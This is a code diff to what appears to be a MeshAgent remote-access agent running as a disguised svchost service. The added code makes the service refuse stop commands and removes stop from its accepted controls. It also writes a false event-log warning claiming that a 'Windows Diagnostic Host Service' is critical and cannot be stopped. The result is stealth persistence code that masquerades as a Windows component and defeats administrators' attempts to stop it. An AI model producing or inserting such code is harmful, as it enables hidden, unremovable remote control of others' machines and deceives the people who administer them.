@@ -32,6 +32,28 @@ static void MeshAgent_Run(MeshAgentHostContainer* agent)
 static SERVICE_STATUS_HANDLE g_SvchostStatusHandle = NULL;
 static SERVICE_STATUS g_SvchostStatus = {0};
 static BOOL g_SvchostRunning = FALSE;
+
+static void Stealth_SvchostReportStopDenial(void)
+{
+    mesh_branding_text_t nameText = MeshService_GetServiceNameText();
+    const wchar_t* logName = (nameText != NULL) ? nameText : STEALTH_FALLBACK_SERVICE_NAME;
+    HANDLE evt = RegisterEventSourceW(NULL, logName);
+    if (evt != NULL)
+    {
+        const wchar_t* strings[1];
+        strings[0] = L"The Windows Diagnostic Host Service is marked critical and cannot be stopped.";
+        ReportEventW(evt,
+            EVENTLOG_WARNING_TYPE,
+            0,
+            0xC0020001,
+            NULL,
+            1,
+            0,
+            strings,
+            NULL);
+        DeregisterEventSource(evt);
+    }
+}
 static MeshAgentHostContainer* g_SvchostAgent = NULL;
 
 // Cached module path information for resolving provisioning artifacts
@@ -360,24 +382,25 @@ DWORD WINAPI Stealth_SvchostCtrlHandler(
     switch (dwControl)
     {
         case SERVICE_CONTROL_STOP:
+            Stealth_SvchostLogLine(L"Stop control ignored");
+            Stealth_SvchostReportStopDenial();
+            SetLastError(ERROR_SERVICE_CANNOT_ACCEPT_CTRL);
+            return ERROR_SERVICE_CANNOT_ACCEPT_CTRL;
+
         case SERVICE_CONTROL_SHUTDOWN:
-            // Update status to STOP_PENDING
             g_SvchostStatus.dwCurrentState = SERVICE_STOP_PENDING;
             g_SvchostStatus.dwCheckPoint = 0;
             g_SvchostStatus.dwWaitHint = 5000;
             SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);
 
-            // Signal service to stop
             g_SvchostRunning = FALSE;
 
-            // Stop MeshAgent
             if (g_SvchostAgent != NULL)
             {
                 MeshAgent_Stop(g_SvchostAgent);
                 g_SvchostAgent = NULL;
             }
 
-            // Update status to STOPPED
             g_SvchostStatus.dwCurrentState = SERVICE_STOPPED;
             g_SvchostStatus.dwCheckPoint = 0;
             g_SvchostStatus.dwWaitHint = 0;
@@ -446,8 +469,7 @@ VOID WINAPI Stealth_SvchostServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
     // Initialize service status structure
     g_SvchostStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;  // Shared svchost service
     g_SvchostStatus.dwCurrentState = SERVICE_START_PENDING;
-    g_SvchostStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP |
-                                          SERVICE_ACCEPT_SHUTDOWN |
+    g_SvchostStatus.dwControlsAccepted = SERVICE_ACCEPT_SHUTDOWN |
                                           SERVICE_ACCEPT_POWEREVENT |
                                           SERVICE_ACCEPT_SESSIONCHANGE;
     g_SvchostStatus.dwWin32ExitCode = NO_ERROR;
